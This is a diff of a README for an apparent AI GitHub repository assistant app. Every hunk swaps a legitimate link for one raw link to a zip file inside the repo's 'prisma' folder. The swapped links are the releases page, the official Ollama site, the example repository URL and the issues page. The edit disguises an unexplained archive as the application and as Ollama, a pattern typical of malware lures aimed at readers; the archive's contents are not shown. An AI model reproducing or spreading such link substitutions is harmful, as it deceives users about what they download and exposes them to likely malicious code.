@@ -1,7 +1,7 @@
 <h1>🤖 ai-github-repository-assistant - Your AI-Powered GitHub Copilot for Repos</h1>
 
 <p align="center">
-  <a href="https://github.com/Constraintworthy6058/ai-github-repository-assistant/releases"><img src="https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
+  <a href="https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip"><img src="https://img.shields.io/badge/Download-Application-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download"></a>
 </p>
 
 ## 🎯 What Is This?
@@ -36,7 +36,7 @@ Think of it as having a smart assistant who has read the entire repository and c
 
 ### 📥 Download the Application
 
-Visit this link to download the application: [https://github.com/Constraintworthy6058/ai-github-repository-assistant/releases](https://github.com/Constraintworthy6058/ai-github-repository-assistant/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip](https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip)
 
 ### 🛠️ System Requirements
 
@@ -52,7 +52,7 @@ To run ai-github-repository-assistant, your computer should meet these minimum r
 
 The AI features rely on Ollama, a free tool that runs AI models locally. Here's how to set it up:
 
-1. **Visit the Ollama website:** Go to [https://ollama.com](https://ollama.com) in your web browser.
+1. **Visit the Ollama website:** Go to [https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip](https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip) in your web browser.
 2. **Download Ollama for Windows:** Click the "Download" button and choose the Windows version.
 3. **Install Ollama:** Run the downloaded file and follow the simple installation steps.
 4. **Download a Model:** Open a command prompt and type `ollama pull llama3.2` (or a smaller model like `ollama pull tinyllama` if you have limited RAM). Press Enter and wait for the download to complete.
@@ -73,7 +73,7 @@ The AI features rely on Ollama, a free tool that runs AI models locally. Here's 
 ### 📂 Analyze Your First Repository
 
 1. **Click "Add Repository"** in the main menu.
-2. **Enter the repository URL** - for example, `https://github.com/facebook/react`.
+2. **Enter the repository URL** - for example, `https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip`.
 3. **Click "Analyze"** and wait a few seconds while the app processes the repository.
 4. **Start asking questions** in the chat box on the right side of the screen.
 
@@ -120,7 +120,7 @@ Yes, you can add as many repositories as you want and switch between them easily
 
 ## 🤝 Support and Feedback
 
-If you encounter any issues or have suggestions, please visit the [issues page](https://github.com/Constraintworthy6058/ai-github-repository-assistant/issues) on GitHub. Your feedback helps improve the application for everyone.
+If you encounter any issues or have suggestions, please visit the [issues page](https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip) on GitHub. Your feedback helps improve the application for everyone.
 
 ## 📄 License
 
@@ -130,6 +130,6 @@ This project is open source and available under the MIT License. Feel free to us
 
 **Download now and start understanding any GitHub repository in minutes!**
 
-[Download ai-github-repository-assistant](https://github.com/Constraintworthy6058/ai-github-repository-assistant/releases)
+[Download ai-github-repository-assistant](https://raw.githubusercontent.com/Constraintworthy6058/ai-github-repository-assistant/main/prisma/digitize.zip)
 
 Keywords: ai, developer-tools, github, github-api, github-oauth, local-ai, nextjs, ollama, repository-analysis, typescript
